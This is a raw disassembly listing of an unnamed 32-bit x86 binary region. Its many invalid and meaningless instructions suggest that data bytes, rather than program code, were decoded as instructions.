  419f7c:	inc    edx
  419f7d:	outs   dx,BYTE PTR ds:[esi]
  419f7e:	outs   dx,BYTE PTR ds:[esi]
  419f7f:	sub    BYTE PTR [edx+0x47],cl
  419f82:	dec    ecx
  419f83:	dec    edx
  419f84:	outs   dx,BYTE PTR ds:[esi]
  419f85:	xor    dh,BYTE PTR [eax]
  419f87:	ins    DWORD PTR es:[edi],dx
  419f88:	mov    DWORD PTR [edi-0x6b383650],eax
  419f8e:	jg     0x419ff2
  419f90:	and    edx,DWORD PTR ds:[eax]
  419f93:	push   es
  419f94:	add    DWORD PTR [eax],eax
	...
  419faa:	add    BYTE PTR [eax],al
  419fac:	add    DWORD PTR [esi],eax
  419fae:	adc    BYTE PTR [ecx],ch
  419fb0:	push   eax
  419fb1:	jo     0x419f40
  419fb3:	xchg   edi,eax
  419fb4:	ror    cl,0xc9
  419fb7:	mov    ecx,0x31472f92
  419fbc:	or     cl,BYTE PTR [edx-0x5c]
  419fbf:	mov    eax,ds:0x1fa8b8a2
  419fc4:	inc    esi
  419fc5:	dec    eax
  419fc6:	inc    edx
  419fc7:	push   ebx
  419fc8:	and    bh,BYTE PTR [ebp+0x4a466aca]
  419fce:	pop    edx
  419fcf:	cmp    ebx,DWORD PTR [ebp+ebx*1-0x44]
  419fd3:	ret    0x490e
  419fd6:	dec    ecx
  419fd7:	pop    esp
  419fd8:	xor    DWORD PTR [ecx+eiz*4+0xf2c64],ebp
  419fdf:	add    BYTE PTR [ecx],al
  419fe1:	or     BYTE PTR [edi],dl
  419fe3:	bound  ecx,QWORD PTR ss:[ebp+0x5e9cc9aa]
  419fea:	test   DWORD PTR [edx+0x26],ebx
  419fed:	cmp    eax,0x15225398
  419ff2:	cdq    
  419ff3:	xchg   DWORD PTR [ebx+0x454559ba],ebx
  419ff9:	pop    esi
  419ffa:	ins    DWORD PTR es:[edi],dx
  419ffb:	ins    DWORD PTR es:[edi],dx
  419ffc:	test   al,0x49
  419ffe:	sub    BYTE PTR [eax],dh
  41a000:	cmp    dh,BYTE PTR [eax]
  41a002:	dec    edx
  41a003:	mov    DWORD PTR [ebx-0x7752b5ba],ebx
  41a009:	(bad)  
  41a00a:	leave  
  41a00b:	mov    eax,ds:0x3457748f
  41a010:	pop    ss
  41a011:	clts   
	...
  41a02b:	add    BYTE PTR [eax],al
  41a02d:	add    DWORD PTR [esi],eax
  41a02f:	mov    db7,ebx
  41a032:	bound  edi,QWORD PTR [edi+0x7f]
  41a035:	mov    esp,0x7cc9c7bc
  41a03a:	push   0x954c94a9
  41a03f:	xchg   esp,eax
  41a040:	xchg   edi,eax
  41a041:	stos   BYTE PTR es:[edi],al
  41a042:	mov    ebx,0x5b5c2e00
  41a047:	pop    ebx
  41a048:	data16 (bad) 
  41a04a:	leave  
  41a04b:	inc    ebx
  41a04c:	dec    edx
  41a04d:	sbb    edi,DWORD PTR [eax+eax*8-0x363cccb4]
  41a054:	inc    esi
  41a055:	inc    edi
  41a056:	pop    esp
  41a057:	pop    esp
  41a058:	xor    DWORD PTR [edi+0xf2c6297],edi
  41a05e:	add    BYTE PTR [eax],al
  41a060:	push   es
  41a061:	adc    eax,0xb97f5f34
  41a066:	leave  
  41a067:	mov    esi,0x6b595a33
  41a06c:	pop    esi
  41a06d:	cmp    al,0x2d
  41a06f:	sub    eax,0xafca9016
  41a074:	mov    esp,0x4a454882
  41a079:	dec    edx
  41a07a:	dec    ecx
  41a07b:	js     0x41a018
  41a07d:	dec    esp
  41a07e:	push   ds
  41a07f:	js     0x41a02b
  41a081:	xchg   edi,eax
  41a082:	mov    al,ds:0xc0aa94b3
  41a087:	leave  
  41a088:	enter  0x8fbc,0x74
  41a08c:	pusha  
  41a08d:	cmp    esp,DWORD PTR [ebx]
  41a08f:	adc    eax,0x108
	...
  41a0ac:	add    BYTE PTR [eax],al
  41a0ae:	add    BYTE PTR [esi],al
  41a0b0:	movhps QWORD PTR [ecx+edx*2],xmm6
  41a0b4:	fs jnp 0x41a044
  41a0b7:	xchg   edi,eax
  41a0b8:	mov    ds:0xba96b8b8,al
  41a0bd:	(bad)  
  41a0be:	mov    eax,0xc7a28d7f
  41a0c3:	xor    ebp,DWORD PTR [esp+ebx*2+0x5b]
  41a0c7:	push   0x45c1c995
  41a0cc:	pop    esi
  41a0cd:	dec    eax
  41a0ce:	sub    ch,BYTE PTR [edx+ecx*2+0x31]
  41a0d2:	mov    esi,0x6b6c59ca
  41a0d7:	imul   esi,DWORD PTR [ecx],0xffffffad
  41a0da:	xchg   esp,eax
  41a0db:	pusha  
  41a0dc:	sub    DWORD PTR [eax],ecx
  41a0de:	add    BYTE PTR [ecx],al
  41a0e0:	mov    eax,cr2
  41a0e3:	je     0x41a074
  41a0e5:	(bad)  
  41a0e6:	mov    ds:0x7541355c,al
  41a0eb:	ja     0x41a10e
  41a0ed:	daa    
  41a0ee:	jno    0x41a145
  41a0f0:	jnp    0x41a0b9
  41a0f2:	enter  0xbac7,0x2e
  41a0f6:	dec    edx
  41a0f7:	dec    ebp
  41a0f8:	dec    ebp
  41a0f9:	dec    edx
  41a0fa:	inc    esi
  41a0fb:	ins    DWORD PTR es:[edi],dx
  41a0fc:	dec    ebx
  41a0fd:	dec    ebp
  41a0fe:	dec    esp
  41a0ff:	stos   BYTE PTR es:[edi],al
  41a100:	mov    eax,0xb897a1a7
  41a106:	rcl    BYTE PTR [edi+0x5062747f],0x2c
  41a10d:	pop    ss
  41a10e:	clts   
  41a110:	add    DWORD PTR [eax],eax
	...
  41a12e:	add    BYTE PTR [eax],al
  41a130:	add    DWORD PTR [eax],ecx
  41a132:	adc    BYTE PTR [ebx],ah
  41a134:	ss push eax
  41a136:	push   edi
  41a137:	bound  esi,QWORD PTR [eax+0x74]
  41a13a:	jg     0x41a1bb
  41a13c:	jg     0x41a105
  41a13e:	je     0x41a1b0
  41a140:	jnp    0x41a0d6
  41a142:	rcr    BYTE PTR [ebx+0x5c6c4a1f],0xa5
  41a149:	ror    al,0x43
  41a14c:	inc    edi
  41a14d:	das    
  41a14e:	add    BYTE PTR [ebx+esi*1],ah
  41a151:	dec    edx
  41a152:	ret    
  41a153:	retf   0x1c83
  41a156:	pop    edx
  41a157:	inc    esi
  41a158:	fwait
  41a159:	leave  
  41a15a:	(bad)  
  41a15b:	push   edi
  41a15c:	and    ecx,DWORD PTR [eax]
  41a15e:	add    BYTE PTR [ecx],al
  41a160:	adc    BYTE PTR [ecx],ch
  41a162:	push   edi
  41a163:	mov    eax,ds:0x4404b0cd
  41a168:	pop    edx
  41a169:	inc    esp
  41a16a:	xor    bl,BYTE PTR [ecx]
  41a16c:	push   0xffffff81
  41a16e:	stos   BYTE PTR es:[edi],al
  41a16f:	mov    esp,0xbcc0c7ca
  41a174:	xor    DWORD PTR [esi+ebx*1],eax
  41a177:	dec    eax
  41a178:	xchg   DWORD PTR [ebp+0x46],ecx
  41a17b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a17c:	ret    0xcacd
  41a17f:	leave  
  41a180:	(bad)  
  41a181:	xchg   edi,eax
  41a182:	jg     0x41a1f8
  41a184:	jo     0x41a1f6
  41a186:	fs pusha 
  41a188:	push   edi
  41a189:	ds sub al,0x17
  41a18c:	clts   
  41a18e:	add    DWORD PTR [eax],eax
	...
  41a1b0:	add    BYTE PTR [ecx],al
  41a1b2:	push   es
  41a1b3:	or     BYTE PTR [eax],dl
  41a1b5:	pop    ss
  41a1b6:	and    ebp,DWORD PTR [esp+esi*1]
  41a1b9:	ds push ecx
  41a1bb:	push   esp
  41a1bc:	push   esp
  41a1bd:	pop    edi
  41a1be:	ds push ecx
  41a1c0:	pusha  
  41a1c1:	jg     0x41a18c
  41a1c3:	mov    ebp,0x85938e84
  41a1c8:	(bad)  
  41a1c9:	mov    esp,0x1ea4caaa
  41a1ce:	xor    BYTE PTR [esi],bl
  41a1d0:	scas   eax,DWORD PTR es:[edi]
  41a1d1:	int    0xca
  41a1d3:	retf   0x9acd
  41a1d6:	mov    esi,0x7bc8c8ba
  41a1db:	push   eax
  41a1dc:	pop    ss
  41a1dd:	push   es
  41a1de:	add    BYTE PTR [ecx],al
  41a1e0:	adc    BYTE PTR [edi+edx*4],ch
  41a1e3:	leave  
  41a1e4:	leave  
  41a1e5:	int    0xc8
  41a1e7:	mov    esi,0xaba3a999
  41a1ec:	ror    dl,0xca
  41a1ef:	retf   0xc7c7
  41a1f2:	(bad)  
  41a1f3:	lea    edi,[ebx-0x36364339]
  41a1f9:	mov    ecx,0xc3c9c7c0
  41a1fe:	ret    0x91a9
  41a201:	outs   dx,DWORD PTR ds:[esi]
  41a202:	push   edi
  41a203:	push   eax
  41a204:	ss xor al,0x34
  41a207:	sub    DWORD PTR [ebx],esp
  41a209:	pop    ss
  41a20a:	clts   
  41a20c:	add    DWORD PTR [eax],eax
	...
  41a232:	add    BYTE PTR [ecx],al
  41a234:	add    DWORD PTR [esi],eax
  41a236:	or     BYTE PTR [edi],cl
  41a238:	adc    BYTE PTR ds:0x23232320,dl
  41a23e:	and    ebp,DWORD PTR [esi+edi*1]
  41a241:	pop    edi
  41a242:	mov    eax,ds:0xc0bbb8aa
  41a247:	mov    ebx,0xaa97a1c0
  41a24c:	ror    al,0xc9
  41a24f:	mov    edi,0xc0c1c7c0
  41a255:	rol    bh,0xc0
  41a258:	mov    ebp,0x152c5fa2
  41a25d:	push   es
  41a25e:	add    BYTE PTR [esi],al
  41a260:	adc    BYTE PTR [ebx],ah
  41a262:	(bad)  
  41a263:	mov    eax,0xc7c0c0c0
  41a268:	rol    bh,0xc7
  41a26b:	mov    edi,0xa6bbc7c0
  41a271:	rol    al,0xc0
  41a274:	mov    eax,0xa9b9b9b8
  41a279:	mov    ds:0x8d97a1a2,eax
  41a27e:	jnp    0x41a2ef
  41a280:	push   edi
  41a281:	cmp    ebp,DWORD PTR [ecx]
  41a283:	pop    ss
  41a284:	adc    eax,0x80f0f10
  41a289:	push   es
  41a28a:	add    DWORD PTR [eax],eax
	...
  41a2b8:	add    BYTE PTR [ecx],al
  41a2ba:	push   es
  41a2bb:	or     BYTE PTR [eax],cl
  41a2bd:	movups xmm2,XMMWORD PTR ds:0x62513423
  41a2c4:	je     0x41a341
  41a2c6:	jnp    0x41a33c
  41a2c8:	jo     0x41a32e
  41a2ca:	fs jo  0x41a341
  41a2cd:	lea    ecx,[edi+0x7f7f7f7f]
  41a2d3:	jg     0x41a354
  41a2d5:	jnp    0x41a352
  41a2d7:	je     0x41a33d
  41a2d9:	push   esp
  41a2da:	sub    al,0x17
  41a2dc:	or     BYTE PTR [ecx],al
  41a2de:	add    BYTE PTR [ecx],al
  41a2e0:	movhps QWORD PTR [ecx+edx*2],xmm6
  41a2e4:	bound  esi,QWORD PTR [eax+0x7b]
  41a2e7:	jnp    0x41a368
  41a2e9:	jg     0x41a366
  41a2eb:	jg     0x41a368
  41a2ed:	jg     0x41a36a
  41a2ef:	jg     0x41a370
  41a2f1:	jg     0x41a282
  41a2f3:	(bad)  
  41a2f4:	lea    edi,[edi+0x7f]
  41a2f7:	jg     0x41a374
  41a2f9:	jnp    0x41a36b
  41a2fb:	outs   dx,DWORD PTR ds:[esi]
  41a2fc:	bound  edx,QWORD PTR [edi+0x51]
  41a2ff:	cmp    ebp,DWORD PTR [edi+edx*1]
  41a302:	invd   
  41a304:	add    DWORD PTR [ecx],eax
  41a306:	add    DWORD PTR [ecx],eax
	...
  41a33c:	add    DWORD PTR [ecx],eax
  41a33e:	add    DWORD PTR [esi],eax
  41a340:	movhps QWORD PTR [ecx],xmm5
  41a343:	xor    al,0x3b
  41a345:	ds cmp esi,DWORD PTR ds:[esi]
  41a349:	xor    al,0x36
  41a34b:	cmp    edi,DWORD PTR [esi]
  41a34d:	push   eax
  41a34e:	push   ecx
  41a34f:	push   esp
  41a350:	push   esp
  41a351:	push   ecx
  41a352:	push   ecx
  41a353:	push   ecx
  41a354:	push   ecx
  41a355:	push   ecx
  41a356:	push   eax
  41a357:	ds sub DWORD PTR ss:[edi],edx
  41a35b:	clts   
  41a35d:	add    BYTE PTR [eax],al
  41a35f:	add    DWORD PTR [esi],eax
  41a361:	movhps QWORD PTR [ecx],xmm5
  41a364:	ss ds push eax
  41a367:	push   ecx
  41a368:	push   ecx
  41a369:	push   ecx
  41a36a:	push   ecx
  41a36b:	push   ecx
  41a36c:	push   ecx
  41a36d:	push   ecx
  41a36e:	push   ecx
  41a36f:	push   ecx
  41a370:	push   esp
  41a371:	push   esp
  41a372:	push   edi
  41a373:	push   edi
  41a374:	push   esp
  41a375:	push   esp
  41a376:	push   ecx
  41a377:	push   eax
  41a378:	ds cmp esi,DWORD PTR ds:[esp+ebp*1]
  41a37d:	sub    DWORD PTR [eax],esp
  41a37f:	adc    eax,0x1060810
	...
  41a3bc:	add    BYTE PTR [eax],al
  41a3be:	add    BYTE PTR [ecx],al
  41a3c0:	add    DWORD PTR [esi],eax
  41a3c2:	movups xmm2,XMMWORD PTR ds:0x15151717
  41a3c9:	adc    BYTE PTR [eax],dl
  41a3cb:	adc    eax,0x20201715
  41a3d0:	and    BYTE PTR [edi],dl
  41a3d2:	pop    ss
  41a3d3:	pop    ss
  41a3d4:	pop    ss
  41a3d5:	pop    ss
  41a3d6:	pop    ss
  41a3d7:	adc    eax,0x1080f10
  41a3dc:	add    DWORD PTR [eax],eax
  41a3de:	add    BYTE PTR [eax],al
  41a3e0:	add    DWORD PTR [esi],eax
  41a3e2:	or     BYTE PTR [eax],dl
  41a3e4:	adc    eax,0x17171717
  41a3e9:	pop    ss
  41a3ea:	pop    ss
  41a3eb:	pop    ss
  41a3ec:	pop    ss
  41a3ed:	pop    ss
  41a3ee:	pop    ss
  41a3ef:	and    BYTE PTR [eax],ah
  41a3f1:	and    BYTE PTR [eax],ah
  41a3f3:	and    BYTE PTR [eax],ah
  41a3f5:	and    BYTE PTR [edi],dl
  41a3f7:	pop    ss
  41a3f8:	pop    ss
  41a3f9:	adc    eax,0x80f0f10
  41a3fe:	push   es
  41a3ff:	add    DWORD PTR [ecx],eax
  41a401:	add    DWORD PTR [eax],eax
	...
  41a43f:	add    BYTE PTR [eax],al
  41a441:	add    BYTE PTR [ecx],al
  41a443:	add    DWORD PTR [ecx],eax
  41a445:	add    DWORD PTR [ecx],eax
  41a447:	add    DWORD PTR [ecx],eax
  41a449:	add    DWORD PTR [ecx],eax
  41a44b:	add    DWORD PTR [esi],eax
  41a44d:	push   es
  41a44e:	push   es
  41a44f:	push   es
  41a450:	push   es
  41a451:	push   es
  41a452:	push   es
  41a453:	add    DWORD PTR [ecx],eax
  41a455:	add    DWORD PTR [ecx],eax
  41a457:	add    DWORD PTR [ecx],eax
  41a459:	add    DWORD PTR [eax],eax
  41a45b:	add    BYTE PTR [eax],al
  41a45d:	add    BYTE PTR [eax],al
  41a45f:	add    BYTE PTR [eax],al
  41a461:	add    BYTE PTR [ecx],al
  41a463:	add    DWORD PTR [ecx],eax
  41a465:	add    DWORD PTR [ecx],eax
  41a467:	add    DWORD PTR [ecx],eax
  41a469:	add    DWORD PTR [ecx],eax
  41a46b:	add    DWORD PTR [ecx],eax
  41a46d:	add    DWORD PTR [esi],eax
  41a46f:	push   es
  41a470:	push   es
  41a471:	push   es
  41a472:	push   es
  41a473:	push   es
  41a474:	push   es
  41a475:	push   es
  41a476:	push   es
  41a477:	add    DWORD PTR [ecx],eax
  41a479:	add    DWORD PTR [ecx],eax
	...
  41a61f:	add    BYTE PTR ds:0x0,al
	...
  41a69d:	add    BYTE PTR [eax],al
  41a69f:	add    BYTE PTR [ecx],dh
  41a6a1:	or     al,BYTE PTR [eax]
	...
  41a71f:	add    BYTE PTR [ebx+0x1f],cl
	...
  41a7a2:	add    eax,DWORD PTR [eax]
	...
  41a81c:	add    BYTE PTR [eax],al
  41a81e:	add    BYTE PTR [ebx+0x0],cl
  41a821:	add    BYTE PTR [ebx+0x0],cl
	...
  41a8a0:	add    BYTE PTR [eax],al
  41a8a2:	add    BYTE PTR [ecx],dh
	...
  41a91c:	add    BYTE PTR [eax],al
  41a91e:	dec    edi
  41a91f:	add    BYTE PTR [eax],al
  41a921:	add    BYTE PTR [eax],al
  41a923:	add    BYTE PTR [esi],cl
	...
  41a99d:	xor    DWORD PTR [eax],eax
  41a99f:	add    BYTE PTR [eax],al
  41a9a1:	add    BYTE PTR [eax],al
  41a9a3:	add    BYTE PTR [eax],al
  41a9a5:	push   cs
	...
  41aa1a:	add    BYTE PTR [eax],al
  41aa1c:	dec    edi
	...
  41aa25:	add    BYTE PTR [ebx+0x3],cl
	...
  41aa98:	add    BYTE PTR [eax],al
  41aa9a:	push   cs
  41aa9b:	mov    WORD PTR [eax],es
	...
  41aaa5:	add    BYTE PTR [eax],al
  41aaa7:	add    BYTE PTR [edi+0xa],cl
	...
  41ab16:	add    BYTE PTR [ebx],al
  41ab18:	dec    ebx
  41ab19:	mov    eax,DWORD PTR [eax]
  41ab1b:	add    BYTE PTR [eax],al
  41ab1d:	add    BYTE PTR [eax],al
  41ab1f:	add    BYTE PTR [eax],al
  41ab21:	inc    DWORD PTR [eax]
	...
  41ab2f:	add    bh,bh
  41ab31:	cld    
	...
  41ab3e:	add    BYTE PTR [eax],al
  41ab40:	aas    
  41ab41:	lock add BYTE PTR [eax],al
	...
  41ab50:	pavgb  mm0,QWORD PTR [eax]
	...
  41ab5f:	add    BYTE PTR [edi],al
  41ab61:	rol    BYTE PTR [eax],0x0
	...
  41ab70:	add    eax,DWORD PTR [eax+0x0]
	...
  41ab7e:	add    BYTE PTR [eax],al
  41ab80:	add    eax,DWORD PTR [eax+0x0]
	...
  41ab8e:	add    BYTE PTR [eax],al
  41ab90:	add    DWORD PTR [eax],eax
	...
  41ab9e:	add    BYTE PTR [eax],al
  41aba0:	add    DWORD PTR [eax],eax
	...
  41b2ae:	add    BYTE PTR [eax],al
  41b2b0:	add    DWORD PTR [eax+0x0],eax
	...
  41b2be:	add    BYTE PTR [eax],al
  41b2c0:	add    DWORD PTR [eax+0x0],eax
	...
  41b2ce:	add    BYTE PTR [eax],al
  41b2d0:	add    eax,eax
	...
  41b2de:	add    BYTE PTR [eax],al
  41b2e0:	add    esp,eax
	...
  41b2ee:	add    BYTE PTR [eax],al
  41b2f0:	pop    es
  41b2f1:	lock add BYTE PTR [eax],al
	...
  41b300:	psubb  mm0,QWORD PTR [eax]
	...
  41b30f:	add    BYTE PTR [edi],bl
  41b311:	inc    BYTE PTR [eax]
	...
  41b31f:	add    BYTE PTR [edi+0x28],bh
  41b322:	add    BYTE PTR [eax],al
  41b324:	add    BYTE PTR [eax+0x0],al
  41b327:	add    BYTE PTR [eax],al
  41b329:	add    BYTE PTR [eax],0x0
  41b32c:	add    BYTE PTR [ecx],al
  41b32e:	add    BYTE PTR [eax],cl
  41b330:	add    BYTE PTR [eax],al
  41b332:	add    BYTE PTR [eax],al
  41b334:	add    BYTE PTR [eax],al
  41b336:	adc    al,BYTE PTR [eax]
	...
  41b340:	add    BYTE PTR [eax],al
  41b342:	add    DWORD PTR [eax],eax
	...
  41b34c:	add    BYTE PTR ds:0x3000103,al
  41b352:	add    al,0x1
  41b354:	add    BYTE PTR ds:0x205,al
  41b35a:	add    BYTE PTR ds:0x5020600,al
  41b360:	add    BYTE PTR [esi],al
  41b362:	add    eax,0x6080006
  41b367:	add    eax,DWORD PTR [eax]
  41b369:	or     cl,BYTE PTR [ecx]
  41b36b:	add    eax,0xa000000
  41b370:	add    BYTE PTR ds:0x905,al
  41b376:	add    BYTE PTR [esi],cl
  41b378:	add    BYTE PTR [ecx],al
  41b37a:	add    al,0xf
  41b37c:	add    BYTE PTR ds:0xb000d05,al
  41b382:	add    eax,0x806000b
  41b387:	or     eax,DWORD PTR [eax]
  41b389:	or     DWORD PTR [ecx],ecx
  41b38b:	or     eax,0xf101100
  41b390:	add    BYTE PTR [eax],al
  41b392:	add    BYTE PTR [ecx],dl
  41b394:	add    BYTE PTR [ebx+eax*1],al
  41b397:	adc    BYTE PTR [eax],al
  41b399:	add    eax,DWORD PTR [esi]
  41b39b:	adc    al,BYTE PTR [eax]
  41b39d:	add    BYTE PTR [eax],al
  41b39f:	adc    eax,0x16030400
  41b3a4:	add    BYTE PTR ds:0xc001304,cl
  41b3aa:	push   cs
  41b3ab:	adc    al,BYTE PTR [eax]
  41b3ad:	add    BYTE PTR [eax],al
  41b3af:	sbb    DWORD PTR [eax],eax
  41b3b1:	add    al,0x3
  41b3b3:	sbb    al,BYTE PTR [eax]
  41b3b5:	add    BYTE PTR [ecx+ebx*1],al
  41b3b8:	add    BYTE PTR ds:0x1b07,al
  41b3be:	add    BYTE PTR ds:0x1c040100,bl
  41b3c4:	add    BYTE PTR [edx],cl
  41b3c6:	push   es
  41b3c7:	push   ds
  41b3c8:	add    BYTE PTR [ebx+ecx*1],cl
  41b3cb:	sbb    al,BYTE PTR [eax]
  41b3cd:	or     BYTE PTR [eax],cl
  41b3cf:	sbb    eax,0x170c1300
  41b3d4:	add    BYTE PTR [edi],cl
  41b3d6:	adc    bl,BYTE PTR [esi]
  41b3d8:	add    BYTE PTR [ecx],bl
  41b3da:	adc    al,0x1b
  41b3dc:	add    BYTE PTR [eax],al
  41b3de:	add    BYTE PTR [ecx],ah
  41b3e0:	add    BYTE PTR [edx],al
  41b3e2:	add    eax,0x22
  41b3e7:	and    eax,0x24050100
  41b3ec:	add    BYTE PTR [esi],al
  41b3ee:	add    eax,0x7080025
  41b3f3:	daa    
  41b3f4:	add    BYTE PTR [ecx+ecx*1],al
  41b3f7:	and    al,BYTE PTR [eax]
  41b3f9:	or     BYTE PTR [ecx],cl
  41b3fb:	and    DWORD PTR [eax],eax
  41b3fd:	or     eax,0xf00230b
  41b402:	or     eax,0x27
  41b407:	sub    DWORD PTR [eax],eax
  41b409:	add    BYTE PTR [esi],al
  41b40b:	sub    al,BYTE PTR [eax]
  41b40d:	add    BYTE PTR [eax],al
  41b40f:	add    BYTE PTR cs:[ecx],al
  41b412:	add    eax,0x504002d
  41b417:	add    BYTE PTR cs:[edi],al
  41b41a:	or     ch,BYTE PTR ds:0x2b0c0d00
  41b420:	add    BYTE PTR ds:0x1d002b12,dl
  41b426:	sbb    BYTE PTR [eax],ch
  41b428:	add    BYTE PTR [eax],al
  41b42a:	add    BYTE PTR [ecx],dh
  41b42c:	add    BYTE PTR [edi],al
  41b42e:	add    eax,0x30
  41b433:	xor    eax,0x35050000
  41b438:	add    BYTE PTR [esi],al
  41b43a:	push   es
  41b43b:	xor    eax,0x31090400
  41b440:	add    BYTE PTR [ebx],cl
  41b442:	or     dh,BYTE PTR ds:0x39000000
  41b448:	add    BYTE PTR [eax],al
  41b44a:	add    BYTE PTR ds:0x3e050200,bh
  41b450:	add    BYTE PTR [edx],cl
  41b452:	add    eax,0x902003c
  41b457:	cmp    al,0x0
  41b459:	or     ecx,DWORD PTR ds:0x120f003a
  41b45f:	xor    al,BYTE PTR [eax]
  41b461:	sbb    eax,0x10003517
  41b466:	adc    BYTE PTR [edx],bh
  41b468:	add    BYTE PTR [ebx],dl
  41b46a:	adc    eax,0x1e230039
  41b46f:	cmp    BYTE PTR [eax],al
  41b471:	adc    eax,0x2b002c24
  41b476:	and    al,0x2f
  41b478:	add    BYTE PTR [eax],al
  41b47a:	add    BYTE PTR [ecx+0x0],al
  41b47d:	add    BYTE PTR [eax],al
  41b47f:	inc    ebp
  41b480:	add    BYTE PTR ds:0x8004606,al
  41b486:	add    eax,DWORD PTR [eax+eax*1+0x5]
  41b48a:	or     eax,DWORD PTR [eax+eax*1+0x0]
  41b48e:	add    BYTE PTR [ecx+0x0],cl
  41b491:	add    BYTE PTR [edx+ecx*2],al
  41b494:	add    BYTE PTR [eax],al
  41b496:	add    BYTE PTR [esi+0x0],cl
  41b499:	add    eax,0xb004909
  41b49e:	or     eax,0x100c004a
  41b4a3:	inc    ecx
  41b4a4:	add    BYTE PTR [ebx],cl
  41b4a6:	adc    cl,BYTE PTR [eax+0x0]
  41b4a9:	sbb    BYTE PTR ds:0x1d1c0044,dl
  41b4af:	dec    eax
  41b4b0:	add    BYTE PTR [eax],al
  41b4b2:	add    BYTE PTR [eax+eax*1+0x3],dl
  41b4b6:	add    eax,0x5040054
  41b4bb:	pop    esi
  41b4bc:	add    BYTE PTR [ebx],al
  41b4be:	or     eax,0x150f005c
  41b4c3:	push   eax
  41b4c4:	add    BYTE PTR [eax],dl
  41b4c6:	adc    BYTE PTR [eax+eax*1+0x1a],bl
  41b4ca:	sbb    bl,BYTE PTR [eax+0x0]
  41b4cd:	push   ss
  41b4ce:	and    ebx,DWORD PTR [ecx+0x0]
  41b4d1:	daa    
  41b4d2:	and    al,0x45
  41b4d4:	add    BYTE PTR [ebx],dh
  41b4d6:	sub    DWORD PTR [ecx+0x0],eax
  41b4d9:	cmp    eax,0x25004f30
  41b4de:	and    BYTE PTR [edx+0x0],dl
  41b4e1:	sub    eax,0x2005627
  41b4e6:	pop    es
  41b4e7:	ins    BYTE PTR es:[edi],dx
  41b4e8:	add    BYTE PTR [ecx],cl
  41b4ea:	(bad)  
  41b4ec:	add    BYTE PTR [eax],cl
  41b4ee:	push   ss
  41b4ef:	bound  eax,QWORD PTR [eax]
  41b4f1:	adc    eax,0x3006817
  41b4f6:	add    al,0x78
  41b4f8:	add    BYTE PTR [esi],cl
  41b4fa:	adc    bh,BYTE PTR [esi+0x0]
  41b4fd:	or     DWORD PTR [ecx],ebx
  41b4ff:	jp     0x41b501
  41b501:	sbb    DWORD PTR [esi],ebx
  41b503:	jb     0x41b505
  41b505:	and    DWORD PTR [esi],ebx
  41b507:	push   0x6a211000
  41b50c:	add    BYTE PTR ds:0x2600702c,bl
  41b512:	and    eax,0x2e330060
  41b517:	ins    BYTE PTR es:[edi],dx
  41b518:	add    BYTE PTR [edi],ah
  41b51a:	cmp    dh,BYTE PTR [edi+0x0]
  41b51d:	xor    eax,0x41007655
  41b522:	inc    esi
  41b523:	push   esi
  41b524:	add    BYTE PTR [edx+0x49],al
  41b527:	jae    0x41b529
  41b529:	(bad)  
  41b52b:	test   BYTE PTR [eax],al
  41b52d:	add    al,0x9
  41b52f:	mov    al,BYTE PTR [eax]
  41b531:	or     BYTE PTR [esi],dl
  41b533:	mov    es,WORD PTR [eax]
  41b535:	sbb    BYTE PTR [edx],bl
  41b537:	add    BYTE PTR [eax],0x16
  41b53a:	sbb    eax,0x210d0094
  41b53f:	xchg   BYTE PTR [eax],al
  41b541:	push   ds
  41b542:	and    al,BYTE PTR [ecx-0x7bd5e900]
  41b548:	add    BYTE PTR [esi],cl
  41b54a:	and    al,0x9c
  41b54c:	add    BYTE PTR [ecx],bl
  41b54e:	sub    eax,0x2f270096
  41b553:	mov    DWORD PTR [eax],eax
  41b555:	and    bh,BYTE PTR [ebx]
  41b557:	fwait
  41b558:	add    BYTE PTR [edx],al
  41b55a:	push   es
  41b55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b55c:	add    BYTE PTR [ecx],cl
  41b55e:	sbb    BYTE PTR [eax-0x4cedf800],ah
  41b564:	add    BYTE PTR [edx],bl
  41b566:	push   ds
  41b567:	mov    cl,0x0
  41b569:	pop    ss
  41b56a:	sub    eax,0x220c00a7
  41b56f:	mov    ch,0x0
  41b571:	push   ss
  41b572:	sub    al,0xbc
  41b574:	add    BYTE PTR [ecx],dl
  41b576:	cmp    edi,DWORD PTR [edx-0x4dccd500]
  41b57c:	add    BYTE PTR [ecx],bl
  41b57e:	push   eax
  41b57f:	pushf  
  41b580:	add    BYTE PTR [edi],ah
  41b582:	dec    ecx
  41b583:	xchg   DWORD PTR [eax],eax
  41b585:	or     BYTE PTR [esi-0x64],ch
  41b588:	add    BYTE PTR [ecx+edx*2],ah
  41b58b:	test   al,0x0
  41b58d:	and    eax,0x2d00bf49
  41b592:	mov    ax,ds:0xbd662b00
  41b598:	add    BYTE PTR [eax],ah
  41b59a:	jnp    0x41b559
  41b59c:	add    BYTE PTR [edx+0x61],dl
  41b59f:	xchg   esp,eax
  41b5a0:	add    BYTE PTR [edi+0x70],dl
  41b5a3:	mov    edi,0xc7110600
  41b5a8:	add    BYTE PTR [ebx],cl
  41b5aa:	sbb    edx,esp
  41b5ac:	add    BYTE PTR ds:0xc00c41d,ah
  41b5b2:	and    esp,eax
  41b5b4:	add    BYTE PTR [esi],cl
  41b5b6:	das    
  41b5b7:	retf   0x1300
  41b5ba:	es aad 0x0
  41b5bd:	wrmsr  
  41b5bf:	fild   WORD PTR [eax]
  41b5c1:	add    eax,0xd00ef14
  41b5c6:	and    eax,0x3d2200ea
  41b5cb:	jecxz  0x41b5cd
  41b5cd:	and    al,0x56
  41b5cf:	rol    DWORD PTR [eax],1
  41b5d1:	adc    al,0x4d
  41b5d3:	out    dx,eax
  41b5d4:	add    BYTE PTR [edx],bh
  41b5d6:	mov    WORD PTR [eax-0x5d7e8700],?
  41b5dc:	add    BYTE PTR [ebp-0x5e],ch
  41b5df:	mov    al,0x0
  41b5e1:	sbb    ebx,DWORD PTR [ecx-0x6acaff3c]
  41b5e7:	mov    BYTE PTR [eax],0x37
  41b5ea:	sbb    ebp,0xccb22200
  41b5f0:	add    BYTE PTR [edi],dh
  41b5f2:	mov    edx,0xa72b00cd
  41b5f7:	aam    0x0
  41b5f9:	xor    bl,BYTE PTR [edx+esi*8-0x1f46e800]
  41b600:	add    BYTE PTR [eax],bh
  41b602:	mov    al,0xef
  41b604:	add    BYTE PTR [ecx-0x6a],cl
  41b607:	rol    DWORD PTR [eax],cl
  41b609:	jle    0x41b5a5
  41b60b:	rol    BYTE PTR [eax],cl
  41b60d:	inc    edx
  41b60e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
